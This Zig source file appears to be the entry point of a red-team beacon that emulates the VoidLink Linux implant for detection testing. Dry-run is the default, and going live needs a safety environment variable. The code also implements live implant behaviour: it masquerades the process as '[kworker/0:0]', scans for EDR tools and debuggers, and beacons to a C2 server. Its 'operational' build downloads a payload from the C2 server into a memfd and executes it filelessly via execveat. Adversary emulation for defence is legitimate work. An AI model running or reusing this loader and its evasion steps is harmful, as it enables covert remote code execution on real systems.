//! de-voidlink beacon -- VoidLink adversary simulation entry point.
//! Replicates the exact syscall sequence: fork->prctl->socket->connect->recvfrom->memfd_create->write->(log execveat)
const std = @import("std");
const config = @import("config.zig");
const syscall = @import("syscall.zig");
const masquerade = @import("masquerade.zig");
const evasion = @import("evasion.zig");
const beacon = @import("beacon.zig");
const build_options = @import("build_options");

pub fn main() !void {
    const allocator = std.heap.page_allocator;

    // -- 1. Parse CLI arguments -------------------------------------------
    var c2_addr: []const u8 = config.DEFAULT_C2_ADDR;
    var c2_port: u16 = config.DEFAULT_C2_PORT;
    var dry_run: bool = true;
    var max_runtime: u32 = 60;
    var max_iterations: u32 = 10;
    var verbose: bool = false;
    var no_masquerade: bool = false;
    var no_evasion: bool = false;
    var arsenal_dir: []const u8 = "./build/arsenal";
    var no_plugins: bool = false;

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    var i: usize = 1; // skip argv[0]
    while (i < args.len) : (i += 1) {
        const arg = args[i];
        if (std.mem.eql(u8, arg, "--c2-addr")) {
            i += 1;
            if (i < args.len) c2_addr = args[i];
        } else if (std.mem.eql(u8, arg, "--c2-port")) {
            i += 1;
            if (i < args.len) c2_port = std.fmt.parseInt(u16, args[i], 10) catch config.DEFAULT_C2_PORT;
        } else if (std.mem.eql(u8, arg, "--dry-run")) {
            dry_run = true;
        } else if (std.mem.eql(u8, arg, "--live")) {
            dry_run = false;
        } else if (std.mem.eql(u8, arg, "--max-runtime")) {
            i += 1;
            if (i < args.len) max_runtime = std.fmt.parseInt(u32, args[i], 10) catch 60;
        } else if (std.mem.eql(u8, arg, "--max-iterations")) {
            i += 1;
            if (i < args.len) max_iterations = std.fmt.parseInt(u32, args[i], 10) catch 10;
        } else if (std.mem.eql(u8, arg, "--verbose")) {
            verbose = true;
        } else if (std.mem.eql(u8, arg, "--no-masquerade")) {
            no_masquerade = true;
        } else if (std.mem.eql(u8, arg, "--no-evasion")) {
            no_evasion = true;
        } else if (std.mem.eql(u8, arg, "--arsenal-dir")) {
            i += 1;
            if (i < args.len) arsenal_dir = args[i];
        } else if (std.mem.eql(u8, arg, "--no-plugins")) {
            no_plugins = true;
        }
    }

    // -- 2. Safety check --------------------------------------------------
    const safety_env = std.posix.getenv(config.SAFETY_ENV_VAR);
    if (safety_env == null or !std.mem.eql(u8, safety_env.?, "1")) {
        if (!dry_run) {
            config.jsonLog("warn", "safety", "\"msg\":\"PHANTOM_LINK_SAFETY!=1, forcing dry-run\"");
            dry_run = true;
        }
    }

    // -- 2b. Non-localhost warning ----------------------------------------
    if (!std.mem.eql(u8, c2_addr, "127.0.0.1") and !std.mem.eql(u8, c2_addr, "localhost") and !std.mem.eql(u8, c2_addr, "::1")) {
        var wbuf: [128]u8 = undefined;
        const wextra = std.fmt.bufPrint(&wbuf, "\"c2_addr\":\"{s}\",\"warning\":\"non-localhost C2 address\"", .{c2_addr}) catch "";
        config.jsonLog("warn", "safety", wextra);
    }

    // -- 3. Startup banner ------------------------------------------------
    {
        var buf: [256]u8 = undefined;
        const mode_str: []const u8 = if (dry_run) "dry-run" else "live";
        const extra = std.fmt.bufPrint(&buf, "\"mode\":\"{s}\",\"c2\":\"{s}:{d}\",\"max_runtime\":{d},\"max_iterations\":{d}", .{
            mode_str,
            c2_addr,
            c2_port,
            max_runtime,
            max_iterations,
        }) catch "";
        config.jsonLog("info", "SAFETY: de-voidlink beacon -- adversary simulation only", extra);
    }

    // -- 4. Process masquerade --------------------------------------------
    if (!no_masquerade) {
        const raw_pid = syscall.sys_getpid();
        const pid: u64 = if (raw_pid >= 0) @intCast(raw_pid) else 0;
        const name = masquerade.selectName(pid);
        if (dry_run) {
            var buf: [128]u8 = undefined;
            const extra = std.fmt.bufPrint(&buf, "\"dry_run\":true,\"target_name\":\"{s}\"", .{name}) catch "";
            config.jsonLog("info", "masquerade", extra);
        } else {
            masquerade.applyAndLog(name);
        }
    }

    // -- 5. Security product enumeration ----------------------------------
    if (!no_evasion) {
        const scan = evasion.scanForEDR();
        evasion.logScanResult(&scan);

        if (evasion.checkDebugger()) {
            config.jsonLog("warn", "debugger_detected", "\"tracer_pid\":\"nonzero\"");
        }
    }

    // -- 6. VoidLink syscall sequence (the Sentinel detection signal) ------
    config.jsonLog("info", "voidlink_sequence", "\"phase\":\"start\"");
    executeVoidLinkSequence(dry_run, c2_addr, c2_port);
    config.jsonLog("info", "voidlink_sequence", "\"phase\":\"complete\"");

    // -- 7. Beacon loop ---------------------------------------------------
    var bcfg = beacon.BeaconConfig.init(c2_addr, c2_port, dry_run);
    bcfg.max_runtime_s = max_runtime;
    bcfg.max_iterations = max_iterations;
    bcfg.verbose = verbose;

    beacon.doHandshake(&bcfg);

    // -- 7b. Arsenal plugin execution (post-handshake, pre-loop) ----------
    if (!no_plugins) {
        var abuf: [256]u8 = undefined;
        const aextra = std.fmt.bufPrint(&abuf, "\"arsenal_dir\":\"{s}\",\"dry_run\":{}", .{ arsenal_dir, dry_run }) catch "";
        config.jsonLog("info", "arsenal_phase", aextra);
        beacon.loadArsenalPlugins(&bcfg, arsenal_dir);
    }

    beacon.beaconLoop(&bcfg);

    // -- 8. Exit ----------------------------------------------------------
    config.jsonLog("info", "de-voidlink beacon terminated", "");
}

/// Execute the VoidLink syscall fingerprint sequence:
/// fork(57) -> prctl(157) -> socket(41) -> connect(42) -> recvfrom(45) -> memfd_create(319) -> write(1) -> [log execveat(322)]
fn executeVoidLinkSequence(dry_run: bool, c2_addr: []const u8, c2_port: u16) void {
    if (dry_run) {
        dryRunSequence();
        return;
    }

    // Step A: fork
    const fork_rc = syscall.sys_fork();
    config.jsonLogSyscall(config.SYS_fork, "fork", fork_rc);

    if (fork_rc < 0) {
        config.jsonLog("error", "fork_failed", "");
        return;
    }

    if (fork_rc == 0) {
        // CHILD PROCESS
        childSequence(c2_addr, c2_port);
        syscall.sys_exit(0);
    }

    // PARENT: continue (child runs the sequence)
    {
        var buf: [64]u8 = undefined;
        const extra = std.fmt.bufPrint(&buf, "\"child_pid\":{d}", .{fork_rc}) catch return;
        config.jsonLog("info", "fork_parent", extra);
    }

    // Wait for child to finish (non-blocking with timeout to prevent hanging
    // if child blocks on recvfrom). WNOHANG=1 polls without blocking.
    var status: i32 = 0;
    const WNOHANG: usize = 1;
    var waited: u32 = 0;
    while (waited < 10) : (waited += 1) {
        const rc = syscall.sys_wait4(fork_rc, &status, WNOHANG);
        if (rc > 0) break; // child exited
        if (rc < 0) break; // error (e.g., no child)
        syscall.sleepMs(100); // child still running, wait 100ms
    }
}

/// Child process: execute the VoidLink signature syscall sequence.
fn childSequence(c2_addr: []const u8, c2_port: u16) void {
    // Step B: prctl(PR_SET_NAME)
    const prctl_rc = masquerade.applyMasquerade("[kworker/0:0]");
    config.jsonLogSyscall(config.SYS_prctl, "prctl", prctl_rc);

    // Step C: socket(AF_INET, SOCK_STREAM, 0)
    const sock_fd = syscall.sys_socket(config.AF_INET, config.SOCK_STREAM, 0);
    config.jsonLogSyscall(config.SYS_socket, "socket", sock_fd);
    if (sock_fd < 0) return;

    // Step D: connect(sock, c2_addr)
    const ip = syscall.parseIpv4(c2_addr) catch {
        _ = syscall.sys_close(@intCast(sock_fd));
        return;
    };
    var sockaddr = syscall.SockaddrIn.init(ip, c2_port);
    const addr_ptr: [*]const u8 = @ptrCast(&sockaddr);
    const conn_rc = syscall.sys_connect(@intCast(sock_fd), addr_ptr, @sizeOf(syscall.SockaddrIn));
    config.jsonLogSyscall(config.SYS_connect, "connect", conn_rc);

    // Step E: recvfrom(sock, buf)
    var recv_buf: [1024]u8 = undefined;
    const recv_rc = syscall.sys_recvfrom(@intCast(sock_fd), &recv_buf, recv_buf.len, 0);
    config.jsonLogSyscall(config.SYS_recvfrom, "recvfrom", recv_rc);

    _ = syscall.sys_close(@intCast(sock_fd));

    // Step F: memfd_create("", MFD_CLOEXEC)
    const memfd = syscall.sys_memfd_create("", config.MFD_CLOEXEC);
    config.jsonLogSyscall(config.SYS_memfd_create, "memfd_create", memfd);

    if (memfd >= 0) {
        if (comptime build_options.operational) {
            // Operational: write actual C2 payload to memfd and execute via execveat
            if (recv_rc > 0) {
                const write_rc = syscall.sys_write_syscall(@intCast(memfd), &recv_buf, @intCast(recv_rc));
                config.jsonLogSyscall(config.SYS_write, "write", write_rc);
                // execveat(memfd, "", NULL, NULL, AT_EMPTY_PATH)
                const exec_rc = syscall.sys_execveat(@intCast(memfd), "", 0, 0, config.AT_EMPTY_PATH);
                config.jsonLogSyscall(config.SYS_execveat, "execveat", exec_rc);
                // If execveat returns, it failed
                config.jsonLog("error", "execveat_failed", "");
            }
        } else {
            // Benign: write dummy payload, never execute
            const dummy_payload = "PHANTOM_LINK_SIMULATED_PAYLOAD";
            const write_rc = syscall.sys_write_syscall(@intCast(memfd), dummy_payload.ptr, dummy_payload.len);
            config.jsonLogSyscall(config.SYS_write, "write", write_rc);
        }

        _ = syscall.sys_close(@intCast(memfd));
    }

    if (comptime !build_options.operational) {
        // Step H: execveat -- LOG ONLY, NEVER EXECUTE in benign mode
        config.jsonLogSyscall(config.SYS_execveat, "execveat", 0);
        config.jsonLog("info", "execveat_skipped", "\"reason\":\"simulation safety -- never execute in simulator\"");
    }
}

/// Dry-run: log each syscall step without executing.
fn dryRunSequence() void {
    const steps = [_]struct { nr: usize, name: []const u8 }{
        .{ .nr = config.SYS_fork, .name = "fork" },
        .{ .nr = config.SYS_prctl, .name = "prctl" },
        .{ .nr = config.SYS_socket, .name = "socket" },
        .{ .nr = config.SYS_connect, .name = "connect" },
        .{ .nr = config.SYS_recvfrom, .name = "recvfrom" },
        .{ .nr = config.SYS_memfd_create, .name = "memfd_create" },
        .{ .nr = config.SYS_write, .name = "write" },
        .{ .nr = config.SYS_execveat, .name = "execveat" },
    };

    for (steps) |step| {
        var buf: [128]u8 = undefined;
        const extra = std.fmt.bufPrint(&buf, "\"nr\":{d},\"name\":\"{s}\",\"dry_run\":true", .{ step.nr, step.name }) catch continue;
        config.jsonLog("info", "syscall_dry", extra);
    }
}
